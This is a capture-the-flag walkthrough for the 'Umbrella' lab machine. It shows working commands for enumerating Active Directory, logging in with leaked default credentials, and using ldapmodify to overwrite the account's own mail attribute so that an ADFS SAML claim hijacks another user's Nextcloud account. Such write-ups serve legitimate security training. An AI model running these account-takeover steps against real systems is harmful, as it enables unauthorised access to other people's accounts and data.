![](Umbrella.assets/banner.png)



<img src="Umbrella.assets/avatar.png" style="margin-left: 20px; zoom: 80%;" align=left />	<font size="10">Umbrella</font>

​		13<sup>th</sup> November 2023 / Document No DYY.100.XX

​		Prepared By: ctrlzero

​		Machine Author: ctrlzero

​		Difficulty: <font color=red>Hard</font>

​		Classification: Official	

# Synopsis

Umbrella is a Hard Windows box that starts off with enumeration of company's landing page that provides information about what they do where there is information leakage via QR code that was accidentally used as a stock photo. This QR code leaks a URL pointing to a Nexcloud public share.

Further enumeration of the account the player will find that they have the ability to reset their own password and email address attributes.  Enumerating the environment it can be seen that a Nextcloud deployment is in place with SAML authentication.  Using the misconfigured account permissions the player can gain access to Nextcloud by hijacking a permitted Nextcloud account by changing the email address attribute to abuse an ADFS misconfigured claim.

## Skills Required

- Active Directory
- SAML Authentication
- Enumeration

## Skills Learned

- Situational awareness and research
- ADFS misconfigurations

# Enumeration

## Nmap

```bash
└───$ nmap -sC -sV -p- umbrella.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-13 10:15 MST
Nmap scan report for umbrella.htb (10.129.229.149)
Host is up (0.12s latency).
rDNS record for 10.129.229.149: dc01.umbrella.htb
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Science Labs
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-14 00:18:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: umbrella.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.umbrella.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc01.umbrella.htb
| Not valid before: 2023-10-20T16:47:41
|_Not valid after:  2024-10-19T16:47:41
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=prd23-nextcloud.umbrella.htb/organizationName=Umbrella
| Not valid before: 2023-10-24T11:36:51
|_Not valid after:  2073-10-11T11:36:51
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: umbrella.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.umbrella.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc01.umbrella.htb
| Not valid before: 2023-10-20T16:47:41
|_Not valid after:  2024-10-19T16:47:41
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: umbrella.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.umbrella.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc01.umbrella.htb
| Not valid before: 2023-10-20T16:47:41
|_Not valid after:  2024-10-19T16:47:41
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: umbrella.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.umbrella.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc01.umbrella.htb
| Not valid before: 2023-10-20T16:47:41
|_Not valid after:  2024-10-19T16:47:41
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
<...snip...>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 239.28 seconds
```

The above output shows that our target is a Windows domain controller with standard ports available.  We have a few pieces of information that will be helpful such as the hostname `dc01.umbrella.htb`, but nothing useful as of yet. Directory busting and vhost fuzzing will be the same as well.  Let's move onto the main landing page at `umbrella.htb`

# Foothold

The landing page is pretty basic information about what Umbrella Corp does as well as some information about their research.  There is nothing that seemingly stands out at first, but looking closer at the information about their headquarters does display an interesting stock photo which features a QR code.

![](Umbrella.assets/foothold1.png)

If we right-click this photo and open it in a new browser tab we can get a larger resolution where we will be able to scan the code to see what it's contents are.  We can use a browser extension tool such as <a href="https://authenticator.cc/">Authenticator</a>
![](Umbrella.assets/foothold2.png)

We can see that this QR code links us to a Nextcloud instance that could be hosting internal company information, which is in fact the case.  
<a href="https://prd23-nextcloud.umbrella.htb/s/NXsK863m6tj7tTB">https://prd23-nextcloud.umbrella.htb/s/NXsK863m6tj7tTB</a>
![](Umbrella.assets/foothold3.png)

Browsing to just <a href="https://prd23-nextcloud.umbrella.htb/">https://prd23-nextcloud.umbrella.htb/</a> we're redirected to `adfs.umbrella.htb` which indicates that Nextcloud is ADFS authenticated.  More on this later...

There is some interesting information in these files  We have a `New Hires.pdf` which indicates that there are two new `IT Support` personnel members being onboarded to the company, `Carlos Olivera` and `Nicholai Ginovaeff`.  
We also have `Welcome.pdf` which is basic information for new hires to review on their first day.  This pdf also outlines the username format as well as first-time logon credentials: `UmrbellaCorp2023!`.  Right away we have access to two `IT Support` staff accounts.

Let's try and get the lay of the land for Active Directory and get data to use with Bloodhound.

```bash
└───✗ bloodhound-python -d umbrella.htb -u colivera -p 'UmbrellaCorp2023!' -dc dc01.umbrella.htb -ns 10.129.229.149 --zip
INFO: Found AD domain: umbrella.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
INFO: Connecting to LDAP server: dc01.umbrella.htb

```

```bash
└───✗ smbclient.py umbrella.htb/colivera:'UmbrellaCorp2023!'@dc01.umbrella.htb 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
```

The above output indicates that we must change our password before logging in.  There are a number of ways to do this from Linux, but for this example we'll use the `smbpasswd.py` script from `Impacket`

```bash
└───✗ smbpasswd.py umbrella/colivera:'UmbrellCorp2023!'@dc01.umbrella.htb -newpass SuperP@ss
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
```

And now we can re-run our Bloodhound command to get a successful AD enumeration zip file.
```bash
└───$ bloodhound-python -d umbrella.htb -u colivera -p SuperP@ss -dc dc01.umbrella.htb -ns 10.129.229.149 --zip
INFO: Found AD domain: umbrella.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.umbrella.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.umbrella.htb
INFO: Found 50 users
INFO: Found 56 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
<...snip...>
INFO: Compressing output into 20231113115220_bloodhound.zip
```

Looking through our Bloodhound data we don't find anything all that interesting that could help elevate our privileges right away, but we find a group called `Nextcloud Admins` and `Nextcloud Users` - this is interesting because we did find that Nextcloud was redirecting to ADFS and this group is potentially controlling who has access to Nextcloud.

![](Umbrella.assets/foothold4.png)

We also see that we have a group membership of `IT Staff`, however we have no outbound controls to any other object in the domain and we'll need to enumerate a bit further using other tools. 
We can start by using `dacledit` and filter on permissions for the principal `Self` as these indicate the permissions that the account can control for itself.  We can quickly filter on what permissions `colivera` has to perform on itself.
We can grab our object SID using Bloodhound under the Node Properties:
`S-1-5-21-757881818-794474345-2904730715-7103` as well as the `IT Staff` object SID: `S-1-5-21-757881818-794474345-2904730715-7102`

```bash
└───# dacledit.py umbrella.htb/colivera:SuperP@ss -dc-ip dc01.umbrella.htb -target colivera -principal-sid S-1-5-21-757881818-794474345-2904730715-7103
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-757881818-794474345-2904730715-7103)
┌─ 10.10.14.46  ctrlzero  parrot in …/HTB/testing/umbrella via  v3.9.2 took 3s on Mon 13 Nov 2023 02:41:09 PM 

└───# dacledit.py umbrella.htb/colivera:SuperP@ss -dc-ip dc01.umbrella.htb -target colivera -principal-sid S-1-5-21-757881818-794474345-2904730715-7102
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-757881818-794474345-2904730715-7102)
[*]   ACE[24] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Public-Information (e48d0154-bcf8-11d1-8702-00c04fb96050)
[*]     Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : IT Staff (S-1-5-21-757881818-794474345-2904730715-7102)
```

Some additional property sets are shown.  Specifically the `Public-Information` property set which includes the ability to update our own `mail` attribute...this will come in handy later.
https://learn.microsoft.com/en-us/windows/win32/adschema/r-public-information
https://learn.microsoft.com/en-us/windows/win32/adschema/a-mail

Lets analyze the traffic between Nextcloud and ADFS to see if we can uncover anything relating to what we know so far.  If we capture an SSO login request with Burpsuite and analyze some of the traffic we can look a `POST` request to the following URL:  
`https://prd23-nextcloud.umbrella.htb/apps/user_saml/saml/acs`

![](Umbrella.assets/foothold5.png)

If we decode the `SAMLResponse` with <a href="https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base64('A-Za-z0-9%2B/%3D',true,false)XML_Beautify('%5C%5Ct')&input=UEhOaGJXeHdPbEpsYzNCdmJuTmxJRWxFUFNKZk9HRm1OelUzTVdNdFpERXhNUzAwTXpReUxXRTRZekl0TWpaaVpHRm1NMkUzWTJVMElpQldaWEp6YVc5dVBTSXlMakFpSUVsemMzVmxTVzV6ZEdGdWREMGlNakF5TXkweE1TMHhORlF3TkRvMU9Eb3dPUzR4T0RkYUlpQkVaWE4wYVc1aGRHbHZiajBpYUhSMGNITTZMeTl3Y21ReU15MXVaWGgwWTJ4dmRXUXVkVzFpY21Wc2JHRXVhSFJpTDJGd2NITXZkWE5sY2w5ellXMXNMM05oYld3dllXTnpJaUJEYjI1elpXNTBQU0oxY200NmIyRnphWE02Ym1GdFpYTTZkR002VTBGTlREb3lMakE2WTI5dWMyVnVkRHAxYm5Od1pXTnBabWxsWkNJZ1NXNVNaWE53YjI1elpWUnZQU0pQVGtWTVQwZEpUbDgxTkRnd1pEZ3lOalZqT0RrNFpHWTRZamRqWW1NM01qUTJZMkUxTURSbU1UZzFNV05sTVRFeElpQjRiV3h1Y3pwellXMXNjRDBpZFhKdU9tOWhjMmx6T201aGJXVnpPblJqT2xOQlRVdzZNaTR3T25CeWIzUnZZMjlzSWo0OFNYTnpkV1Z5SUhodGJHNXpQU0oxY200NmIyRnphWE02Ym1GdFpYTTZkR002VTBGTlREb3lMakE2WVhOelpYSjBhVzl1SWo1b2RIUndPaTh2WVdSbWN5NTFiV0p5Wld4c1lTNW9kR0l2WVdSbWN5OXpaWEoyYVdObGN5OTBjblZ6ZER3dlNYTnpkV1Z5UGp4ellXMXNjRHBUZEdGMGRYTSUyQlBITmhiV3h3T2xOMFlYUjFjME52WkdVZ1ZtRnNkV1U5SW5WeWJqcHZZWE5wY3pwdVlXMWxjenAwWXpwVFFVMU1Pakl1TURwemRHRjBkWE02VTNWalkyVnpjeUlnTHo0OEwzTmhiV3h3T2xOMFlYUjFjejQ4UVhOelpYSjBhVzl1SUVsRVBTSmZZV0ZpTWpneU5EWXRaalptTkMwMFpqTTJMV0kxWXprdE1EQmtaamMzWkdFNVpHRTJJaUJKYzNOMVpVbHVjM1JoYm5ROUlqSXdNak10TVRFdE1UUlVNRFE2TlRnNk1Ea3VNVEkwV2lJZ1ZtVnljMmx2YmowaU1pNHdJaUI0Yld4dWN6MGlkWEp1T205aGMybHpPbTVoYldWek9uUmpPbE5CVFV3Nk1pNHdPbUZ6YzJWeWRHbHZiaUklMkJQRWx6YzNWbGNqNW9kSFJ3T2k4dllXUm1jeTUxYldKeVpXeHNZUzVvZEdJdllXUm1jeTl6WlhKMmFXTmxjeTkwY25WemREd3ZTWE56ZFdWeVBqeGtjenBUYVdkdVlYUjFjbVVnZUcxc2JuTTZaSE05SW1oMGRIQTZMeTkzZDNjdWR6TXViM0puTHpJd01EQXZNRGt2ZUcxc1pITnBaeU1pUGp4a2N6cFRhV2R1WldSSmJtWnZQanhrY3pwRFlXNXZibWxqWVd4cGVtRjBhVzl1VFdWMGFHOWtJRUZzWjI5eWFYUm9iVDBpYUhSMGNEb3ZMM2QzZHk1M015NXZjbWN2TWpBd01TOHhNQzk0Yld3dFpYaGpMV014Tkc0aklpQXZQanhrY3pwVGFXZHVZWFIxY21WTlpYUm9iMlFnUVd4bmIzSnBkR2h0UFNKb2RIUndPaTh2ZDNkM0xuY3pMbTl5Wnk4eU1EQXhMekEwTDNodGJHUnphV2N0Ylc5eVpTTnljMkV0YzJoaE1qVTJJaUF2UGp4a2N6cFNaV1psY21WdVkyVWdWVkpKUFNJalgyRmhZakk0TWpRMkxXWTJaalF0TkdZek5pMWlOV001TFRBd1pHWTNOMlJoT1dSaE5pSSUyQlBHUnpPbFJ5WVc1elptOXliWE0lMkJQR1J6T2xSeVlXNXpabTl5YlNCQmJHZHZjbWwwYUcwOUltaDBkSEE2THk5M2QzY3Vkek11YjNKbkx6SXdNREF2TURrdmVHMXNaSE5wWnlObGJuWmxiRzl3WldRdGMybG5ibUYwZFhKbElpQXZQanhrY3pwVWNtRnVjMlp2Y20wZ1FXeG5iM0pwZEdodFBTSm9kSFJ3T2k4dmQzZDNMbmN6TG05eVp5OHlNREF4THpFd0wzaHRiQzFsZUdNdFl6RTBiaU1pSUM4JTJCUEM5a2N6cFVjbUZ1YzJadmNtMXpQanhrY3pwRWFXZGxjM1JOWlhSb2IyUWdRV3huYjNKcGRHaHRQU0pvZEhSd09pOHZkM2QzTG5jekxtOXlaeTh5TURBeEx6QTBMM2h0YkdWdVl5TnphR0V5TlRZaUlDOCUyQlBHUnpPa1JwWjJWemRGWmhiSFZsUGxwT1RHTTFMMHd3VXpkbFpGWjFjMEUwUldVMWVGUjNZVXAxVFhwTGVEUmtOMlZzTHpBeGFVZExhMEU5UEM5a2N6cEVhV2RsYzNSV1lXeDFaVDQ4TDJSek9sSmxabVZ5Wlc1alpUNDhMMlJ6T2xOcFoyNWxaRWx1Wm04JTJCUEdSek9sTnBaMjVoZEhWeVpWWmhiSFZsUGtKbmEwZzJVbFJ2U0ZwUE9IWTFURzQ1UlRsbE16RjNWVmxCZHpSQmJqVkdUa001ZUU5SFkzSjRXREJGZDJSS1ZWaGpSVVkwZEdrMU5rWlJjVGMzTjFCUmVHOUhVVVJvZGxwME0xWlRlSFU1SzB4dk1UaG9WemMzUXpSdGVFNTRTRkJaYlhjeVp6Rk9Wa0p3U1V0MGMyTTRTVGcxTURrcmVIaHNVRlJITVVWM05XVnpPVTE1TWpoUFZsWnVXSFZsU2toNWJGWkVhMXAyVmtGbFZuVklNR0pLY1d4TmVYSjZaRGt3WWtFMGJsWjFaRkJZY1UxSmVIWk1Za0pPYURsS09XWnBZbmczV1VZME5VZFNiWEJhTVZNM1UweE9lbkpDUTBScGIzWlpTekJQVm1rd01uUnBaWEZNWlZRMFlsZGtNSE5vU1dOWWRVRnFNSFE1TVZOb2JtNXdUMDQyUkdKMmQzSm1PSFZNZFN0a1MwbHZabUpTWjI5clZsRldkR1JHSzNkVmNXSmhiMWgwVDJWRFZISkRkRXRWVmxZNVZVYzVVSGRKYkdaSmVtRlNRMnQ2U0hoeFpFSTFMMXAzZGl0VGQycDFOM1p0WjBsM1RGUlZXRGhUV2pKRVYwWnRXbk0yUVRsdFFubFJWbk55TDJsTGVrWkxUa1pEZDJ4QlVYZ3ZZblF2SzIxcGExWnllSFZHTTJGU1ZHbENObmhsVGtZeVZYSlNUalZDZG05Rk4wVXlOMEV5WkVwd1ZFVjFiMEl5WmxsclVtZ3JiVUZQUlZweVYwMUxaaTlaT1Vnd2J6UjNObUZzUzJSclJHeHZZM0ZyYUM5bFRqRldaazlSVTBsdVlqVkNURFoyU2tGQmQxSm1jbVJ3YXk5aFNsaFlaMjg1VlRKa09EazVaVVUzY21wU2JGUjFaakJLTUcxQksxTlVUVXRzWjBaTVkxSmtUR3hyYlRaYVRFOTBObWRWZVdSeVJGQXdlRWxZYTNJcmVUaG5aRGxaVDA4emIyMU9VR016UlhWM1EweG1Wek4yUWpRd2NGWjNiVWh1V0hkelZWbFdUR2gyY3lzNE9GRjJlak5ySzIxVWNURnhheXQ2VUdKNmEyaDNlVXgzZDBab1VsazFUMlV2VTBSTFdXSlJkVVJYVHpacFJsSjJUa2hPV21GWVdWTkJZVXAwUTJWTmEwMWxVVTFIVUZwMFkxbFVhMFpSUFR3dlpITTZVMmxuYm1GMGRYSmxWbUZzZFdVJTJCUEV0bGVVbHVabThnZUcxc2JuTTlJbWgwZEhBNkx5OTNkM2N1ZHpNdWIzSm5Mekl3TURBdk1Ea3ZlRzFzWkhOcFp5TWlQanhrY3pwWU5UQTVSR0YwWVQ0OFpITTZXRFV3T1VObGNuUnBabWxqWVhSbFBrMUpTVVUwUkVORFFYTnBaMEYzU1VKQlowbFJXVVZMZEZCS01UQXJjVkpMUTNOc1MzUk5aR3BvVkVGT1FtZHJjV2hyYVVjNWR6QkNRVkZ6UmtGRVFYSk5VMnQzU25kWlJGWlJVVVJGZVVKQ1VrVmFWRWxHVG5CYU1qVndZbTFqWjB4VFFtaGFSMXA2VEc1V2RGbHVTbXhpUjNob1RHMW9NRmxxUVdkR2R6QjVUWHBGZDAxcVJYbE5la1Y0VFVSc1lVZEJPSGxOVkVGNlRWUkJkMDFxU1hwTlZFVjNUMVp2ZDB0NlJYQk5RMk5IUVRGVlJVRjRUV2RSVlZKSFZYbENWR0ZYWkhWaFZ6VnVTVU13WjFsWFVtMWplVFV4WWxkS2VWcFhlSE5aVXpWdlpFZEpkMmRuU1dsTlFUQkhRMU54UjFOSllqTkVVVVZDUVZGVlFVRTBTVU5FZDBGM1oyZEpTMEZ2U1VOQlVVTTBUV0ZpUjB4RE5GVTRVRTQwUmxabmRGTk5aRnBIZGxaQ2R6ZFJNa2hNTUdOV1pYTnVPRlJEVFUxTVQxb3pVMGRqWms1bVNHRkRLMEZIVkVoa00xRjZTMVpHVkdSd1lXZFRlVEpGWWpoR1NqUmFWWEIzVmtwemJTOHhSR0p4WkVsTVNEVmpjRGwzUlROU1dISlpkbUkwZERGcFRsSnlNRE5ZU1c5dWRrOUtkM0YwVmtZd1VqVnRiSFphV0hsWGJEVXlUMXBVYjNRMWEyUjFZVXN6TUVKbmFsTldiRVp6WnpoWGVUQkZkR2xRUzFkUmNrUkdUWFpMTkhoSlZFNXdWbk5OWTJnelVtUkJhMkpZYkhSSFYwdHNSbTFHT0dOdmVXUlBSekJrZDJ0V09HbFVXV04xZFRoNVNDOXlTM05sU2xGcGNHRXdhaTlMVTFRNU4yNTZaa2hKV2xOeVJWSTVNRWd3VjBscWNUTk9jVmxLYm1FclNFUkRjamhhU0RsMmRGcFlVa3hrYUVkTFJrNUNVa04zU1UxblRFMDFZbEF2V0haNWFXSjZhRGRZVlZWMmVHZHdNU3RLZUhoVGIybFFSbW81YVZkQk16TnZTa2x4TWxGNmJWVTVOVnBzTWtsbU4yUjRZM0kyWXpscGFrZDFPVVJEUVd0dlRsSkVVMVp6TUVFeWFIQjZNRmQzWjBwd05WZFFkMmhUTm5OeE0yUTVTMGxHU2tWQ2VXaEROa05GTDBzd01ISlNWMmh0YWpVdlFXVlBXVlpOZEd4WmNrbGFTRUpNY0U1T01HaHBiMnhFYjFNNVdYZ3ljVGxsUTAweFowWm1OMlJ6ZW1oSFFrVlNVVlpyTDFoMlNHcEdVRFZuYms1TFVXcHJhbmhMTUZVNU1tWmlhMk5zSzJoVU1IQktlSFJVUVZoaE5VTk5abW8yUkVKMGN6aGxTMVpMT1RsWFpYcDNialJIYm5SVmVGTTNhbVptYzAxUFlUWkhTVFprVUZWdVJtNHhWV2MzTmxWc05rODFkbTF1ZUhGcVp5OWpOMVZYWTNreFNHOHZMelZETWtKWGMwOUNTM1UxTkdSVWRYaDJLMmQ2YVZsSk15OVlRek5vVldWSVlYaHVhV3BRYm1keFowaEtUek53YVd4U1FVSjZUUzl6YTBGNFZrVkNSa2c0YlZScVJteFJRa2RwYTBReE1tY3JjMDV3T0c1V1VVbEVRVkZCUWsxQk1FZERVM0ZIVTBsaU0wUlJSVUpEZDFWQlFUUkpRMEZSUVU5c2VtdzRWalp2UlZFME9UUnNUbXcyU2t3d1lUWmlNamtyZURGUE5XNU1iR3hsYjFsc2JFdFZORmwwV0hodGJ6WnJXV1ZUWjNGM1VWbG1NMGsyWnpkRlRXcDNNMmhtYTJKSFdGbDFOVVZZWWpRck5TOXRZbWRET1VsMmExRlhjRmxxZDNaR1NIRnNXa0ZrVVdodVRVdEdlR28xVDJSbFIyTm5WbEZMVDJSTVEwUnplVEJxTkZGQmNGWnFURmh4WlhwVmNGQmhaa1ZEVFdadVVHVjRVQzlFZVU0MFVuQlFlRFJwUWsxalVIWnpTM2xETm5aV2VFbEhObWRJT1RKcmIzRkJiMEl4YkVSTlJYUlBaeTlXVERNNE1rSjJia3hxZHpGaE9GRk9OMVpLYUVwVWMyMTRXRTFUTVZKTVpGRm9iakJLUXpJM1RrTnFiREZwYzIxRWFtRmlZbnBWTkVGV1NqQkJSMmhsY21aVE1tSjZTREZ1WjBsaVIyMU5jVFZTVEZaelNYb3lRVFJxTkRnNGQxZFNRVTl1WmpsRk16RnZlRTFGTUdsamVrMUJkblpZYTFrd2FYVnlObG94YmpKYU5rRTFkMUl4UkRjd1VGcE9VbmxNYjI5NlNrWmhhMGxIY1dvMlFYSmtZak16T0dReVluRmxXVTVRYUhSWmJXNUtNMFJCY21aTVprdE9TbkZ4VWpObFRtMWhUSGRvYVVobEt6TlhibkprUlVFMlFUSlJOemhDUm10Qk9VRnNNWFo0VVVoR1ZXdzFlamhTYlZOb2JEaHZhRWRrYmpsbWF6Vm9LMHczU25WS1dsTTFRbkpyUkhaWU1ETlFkbk5xUkdVclNqTjBkMkphVjJoSVYySkdZMDR6VUVOdE5tdDZjRGhFYlZWdVdXOWpWRGxzT0cweFpGZHFOVkkwY1ZWNVpGQnplRWs1YWt4MFIxbzFjaTgwUzA5bFFVRnNRMXB4YkhCcVJIZEtSa0l3Ym5sTE5WUlFlbkJYSzBOdmVUQk5lall5ZVVrMFdEWnBSamw0Ym1KUVVqY3lTMmxsWVhoTWF6RTVSMmRTT1U1S1RsWlphMVJaVm1wNFkzaDVRVk5qZEV4clZGVkVZVnBWYlZwa0t6bFBTRzFyWW0xcGFrWTNOVzFvYjFnck5FcDFNbVJPWkVFNFVqVnZVRGRJTHpRclpVZHlhMGszYldOeFlVUnVhMHRSUFQwOEwyUnpPbGcxTURsRFpYSjBhV1pwWTJGMFpUNDhMMlJ6T2xnMU1EbEVZWFJoUGp3dlMyVjVTVzVtYno0OEwyUnpPbE5wWjI1aGRIVnlaVDQ4VTNWaWFtVmpkRDQ4VTNWaWFtVmpkRU52Ym1acGNtMWhkR2x2YmlCTlpYUm9iMlE5SW5WeWJqcHZZWE5wY3pwdVlXMWxjenAwWXpwVFFVMU1Pakl1TURwamJUcGlaV0Z5WlhJaVBqeFRkV0pxWldOMFEyOXVabWx5YldGMGFXOXVSR0YwWVNCSmJsSmxjM0J2Ym5ObFZHODlJazlPUlV4UFIwbE9YelUwT0RCa09ESTJOV000T1Roa1pqaGlOMk5pWXpjeU5EWmpZVFV3TkdZeE9EVXhZMlV4TVRFaUlFNXZkRTl1VDNKQlpuUmxjajBpTWpBeU15MHhNUzB4TkZRd05Ub3dNem93T1M0eE9EZGFJaUJTWldOcGNHbGxiblE5SW1oMGRIQnpPaTh2Y0hKa01qTXRibVY0ZEdOc2IzVmtMblZ0WW5KbGJHeGhMbWgwWWk5aGNIQnpMM1Z6WlhKZmMyRnRiQzl6WVcxc0wyRmpjeUlnTHo0OEwxTjFZbXBsWTNSRGIyNW1hWEp0WVhScGIyNCUyQlBDOVRkV0pxWldOMFBqeERiMjVrYVhScGIyNXpJRTV2ZEVKbFptOXlaVDBpTWpBeU15MHhNUzB4TkZRd05EbzFPRG93T1M0eE1EaGFJaUJPYjNSUGJrOXlRV1owWlhJOUlqSXdNak10TVRFdE1UUlVNRFU2TlRnNk1Ea3VNVEE0V2lJJTJCUEVGMVpHbGxibU5sVW1WemRISnBZM1JwYjI0JTJCUEVGMVpHbGxibU5sUG1oMGRIQnpPaTh2Y0hKa01qTXRibVY0ZEdOc2IzVmtMblZ0WW5KbGJHeGhMbWgwWWk5aGNIQnpMM1Z6WlhKZmMyRnRiQzl6WVcxc0wyMWxkR0ZrWVhSaFBDOUJkV1JwWlc1alpUNDhMMEYxWkdsbGJtTmxVbVZ6ZEhKcFkzUnBiMjQlMkJQQzlEYjI1a2FYUnBiMjV6UGp4QmRIUnlhV0oxZEdWVGRHRjBaVzFsYm5RJTJCUEVGMGRISnBZblYwWlNCT1lXMWxQU0oxYzJWeVVISnBibU5wY0dGc1RtRnRaU0klMkJQRUYwZEhKcFluVjBaVlpoYkhWbFBtTnZiR2wyWlhKaFFIVnRZbkpsYkd4aExtaDBZand2UVhSMGNtbGlkWFJsVm1Gc2RXVSUyQlBDOUJkSFJ5YVdKMWRHVSUyQlBFRjBkSEpwWW5WMFpTQk9ZVzFsUFNKb2RIUndPaTh2YzJOb1pXMWhjeTU0Yld4emIyRndMbTl5Wnk5M2N5OHlNREExTHpBMUwybGtaVzUwYVhSNUwyTnNZV2x0Y3k5bmFYWmxibTVoYldVaVBqeEJkSFJ5YVdKMWRHVldZV3gxWlQ1RFlYSnNiM004TDBGMGRISnBZblYwWlZaaGJIVmxQand2UVhSMGNtbGlkWFJsUGp4QmRIUnlhV0oxZEdVZ1RtRnRaVDBpYzBGTlFXTmpiM1Z1ZEU1aGJXVWlQanhCZEhSeWFXSjFkR1ZXWVd4MVpUNWpiMnhwZG1WeVlUd3ZRWFIwY21saWRYUmxWbUZzZFdVJTJCUEM5QmRIUnlhV0oxZEdVJTJCUEVGMGRISnBZblYwWlNCT1lXMWxQU0pvZEhSd09pOHZjMk5vWlcxaGN5NTRiV3h6YjJGd0xtOXlaeTlqYkdGcGJYTXZRMjl0Ylc5dVRtRnRaU0klMkJQRUYwZEhKcFluVjBaVlpoYkhWbFBrTmhjbXh2Y3lCUGJHbDJaWEpoUEM5QmRIUnlhV0oxZEdWV1lXeDFaVDQ4TDBGMGRISnBZblYwWlQ0OEwwRjBkSEpwWW5WMFpWTjBZWFJsYldWdWRENDhRWFYwYUc1VGRHRjBaVzFsYm5RZ1FYVjBhRzVKYm5OMFlXNTBQU0l5TURJekxURXhMVEUwVkRBME9qVTNPakF4TGpjM05Wb2lQanhCZFhSb2JrTnZiblJsZUhRJTJCUEVGMWRHaHVRMjl1ZEdWNGRFTnNZWE56VW1WbVBuVnlianB2WVhOcGN6cHVZVzFsY3pwMFl6cFRRVTFNT2pJdU1EcGhZenBqYkdGemMyVnpPbEJoYzNOM2IzSmtVSEp2ZEdWamRHVmtWSEpoYm5Od2IzSjBQQzlCZFhSb2JrTnZiblJsZUhSRGJHRnpjMUpsWmo0OEwwRjFkR2h1UTI5dWRHVjRkRDQ4TDBGMWRHaHVVM1JoZEdWdFpXNTBQand2UVhOelpYSjBhVzl1UGp3dmMyRnRiSEE2VW1WemNHOXVjMlUlMkIm">Cyberchef</a> we can discover that ADFS is sending the `UserPrincipalName` attribute to Nextcloud as part of the attribute mapping.  This mapping specifies that the `UserPrincipalName` attribute from the identity provider, `ADFS`, will be included as a claim when authenticating with the relying party, which, in this case, is Nextcloud. 

```xml
<AttributeStatement>
			<Attribute Name="userPrincipalName">
				<AttributeValue>colivera@umbrella.htb</AttributeValue>
			</Attribute>
			<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname">
				<AttributeValue>Carlos</AttributeValue>
			</Attribute>
```

Generally with ADFS single sign-on the UPN more often than not mirrors an e-mail address.  Knowing that we can update our own e-mail address we can potentially hijack a user in Nextcloud.  Let's try and hijack the `Alice Redfield` account `aredfield@umbrella.htb`.
We'll create a `.ldif` file to use with `ldapmodify`

`user_hijack.ldif`
```json
dn: CN=Carlos Olivera,OU=IT Staff,OU=Employees,DC=umbrella,DC=htb
changetype: modify
replace: mail
mail: aredfield@umbrella.htb
```

And we'll execute it with the following:
```bash
└───# ldapsearch -H ldap://dc01.umbrella.htb -b 'DC=umbrella,DC=htb' -D "CN=CARLOS OLIVERA,OU=IT STAFF,OU=EMPLOYEES,DC=UMBRELLA,DC=HTB" -w "SuperP@ss" "(sAMAccountName=colivera)" | grep mail
mail: colivera@umbrella.htb

└───# ldapmodify -H ldap://dc01.umbrella.htb -D "CN=CARLOS OLIVERA,OU=IT STAFF,OU=EMPLOYEES,DC=UMBRELLA,DC=HTB" -w "SuperP@ss" -f user_hijack.ldif -v
ldap_initialize( ldap://dc01.umbrella.htb:389/??base )
replace mail:
	aredfield@umbrella.htb
